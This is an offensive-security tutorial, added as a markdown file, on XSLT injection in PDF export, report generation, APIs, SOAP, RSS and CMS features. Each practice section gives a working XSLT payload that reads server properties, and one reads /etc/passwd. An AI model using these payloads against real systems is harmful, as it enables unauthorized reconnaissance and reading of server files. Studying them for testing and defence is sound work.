@@ -1,0 +1,144 @@
+---
+title: XSLT Injection in Web Applications Context
+description: Explore how XSLT injection affects web applications, with exploitation
+  techniques and common vulnerable features.
+keywords:
+- XSLT injection
+- XML vulnerabilities
+- web application security
+- PDF generation attacks
+- report generation vulnerabilities
+- SOAP service exploitation
+- data transformation APIs
+- CMS XSLT injection
+- RSS feed transformation
+- server-side XSLT exploitation
+---
+
+# Application Context
+
+## Context
+
+The goal of this article is to demonstrate how XSLT injection vulnerabilities can be exploited within various web application contexts. XSLT injection is a technique used in offensive cybersecurity to manipulate or execute malicious code through unsanitized user input in XSLT stylesheets. To fully understand this topic, readers need prior knowledge of how XSLT processing works, the structure and parsing of XML, and the basic architecture of web applications, including general techniques for XSLT injection.
+
+## Theory
+
+### XSLT Injection in Web Application Features
+
+XSLT injection vulnerabilities occur when user-supplied input is unsafely embedded into XSLT stylesheets processed by the server. This often happens in application features which transform or generate content using XML or XSLT provided by users. An attacker can exploit these vulnerabilities by identifying entry points where their input can affect XSLT processing, injecting malicious XSLT code, and triggering the execution to achieve undesirable effects.
+
+### Common Vulnerable Application Contexts
+
+Various application contexts are prone to XSLT injection due to their reliance on dynamic transformations and rendering of user-generated content.
+
+- **PDF Generation**: Features allowing users to export data into PDF formats, where they can upload XML or XSLT, present opportunities for injection attacks.
+- **XML Report Generation**: Custom reporting capabilities that use XML/XSLT templates can be targeted to alter data transformations maliciously.
+- **Data Transformation APIs**: Endpoints converting XML to HTML or JSON through XSLT can be exploited if they process untrusted input.
+- **SOAP Web Services**: Transformations applied to SOAP messages with XSLT are vulnerable to injection by crafted payloads.
+- **RSS Feed Transformation**: Applications using XSLT to render RSS feeds risk manipulation if they do not validate input sources.
+- **CMS Systems**: Content management systems that permit custom XSLT for rendering content may give attackers a path to introduce malicious stylesheets.
+
+### Attacker Mindset: Targeting XSLT in Application Workflows
+
+An offensive strategy includes mapping application features that accept XML/XSLT input or templates. The attacker then probes these features to find reflection or execution of injected XSLT expressions, leveraging business logic, such as report generation or document exports, to trigger these transformations maliciously.
+
+## Practice
+
+### Exploiting PDF Generation via XSLT Injection
+
+1. Identify features for PDF export or report generation that accept XML or XSLT uploads.
+2. Inject the following XSLT payload to extract the server operating system's name:
+
+   ```xml
+   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+       <xsl:template match="/">
+           <xsl:value-of select="system-property('os.name')"/>
+       </xsl:template>
+   </xsl:stylesheet>
+   ```
+
+3. Submit the crafted payload and download the resulting PDF.
+4. Review the PDF to detect any injected output such as the server OS name.
+
+### Abusing XML Report Generation with XSLT Injection
+
+1. Locate report generation functions that accept user-supplied XML or XSLT templates.
+2. Use the following payload to attempt reading sensitive server-side files:
+
+   ```xml
+   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+       <xsl:template match="/">
+           <xsl:value-of select="document('file:///etc/passwd')"/>
+       </xsl:template>
+   </xsl:stylesheet>
+   ```
+
+3. Trigger the report generation and check the output for contents of the targeted file.
+
+### Targeting Data Transformation APIs for XSLT Injection
+
+1. Identify API endpoints that convert XML to other formats using XSLT.
+2. Inject the following payload to gather server user information from API responses:
+
+   ```xml
+   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+       <xsl:template match="/">
+           <xsl:value-of select="system-property('user.name')"/>
+       </xsl:template>
+   </xsl:stylesheet>
+   ```
+
+3. Submit this payload and analyze the API's response for sensitive information returns.
+
+### Exploiting SOAP Web Services with XSLT Injection
+
+1. Discover SOAP endpoints where XSLT transforms messages.
+2. Use this payload to determine the Java runtime version in the SOAP response:
+
+   ```xml
+   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+       <xsl:template match="/">
+           <xsl:value-of select="system-property('java.version')"/>
+       </xsl:template>
+   </xsl:stylesheet>
+   ```
+
+3. Inject this payload within a SOAP request and verify the response for the extracted data.
+
+### Attacking RSS Feed Transformation in Web Applications
+
+1. Identify features in applications using XSLT for RSS feed imports or transformations.
+2. Inject this payload to extract the architecture of the server into the feed:
+
+   ```xml
+   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+       <xsl:template match="/">
+           <xsl:value-of select="system-property('os.arch')"/>
+       </xsl:template>
+   </xsl:stylesheet>
+   ```
+
+3. Submit the payload and closely inspect the transformed feed output for leaked data.
+
+### Compromising CMS Systems via Custom XSLT Injection
+
+1. Identify CMS plugins/modules allowing custom XSLT for rendering content.
+2. Inject the following payload to access and present the server's working directory:
+
+   ```xml
+   <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+       <xsl:template match="/">
+           <xsl:value-of select="system-property('user.dir')"/>
+       </xsl:template>
+   </xsl:stylesheet>
+   ```
+
+3. Use the CMS to preview or publish the content and look for leaking server data.
+
+## Tools
+
+- **Burp Suite**
+- **Postman**
+- **curl** 
+
+This document provides a practical framework for understanding and exploiting XSLT injection in various application contexts, allowing attackers to leverage weak points in web services that use or transform XML input in insecure ways.
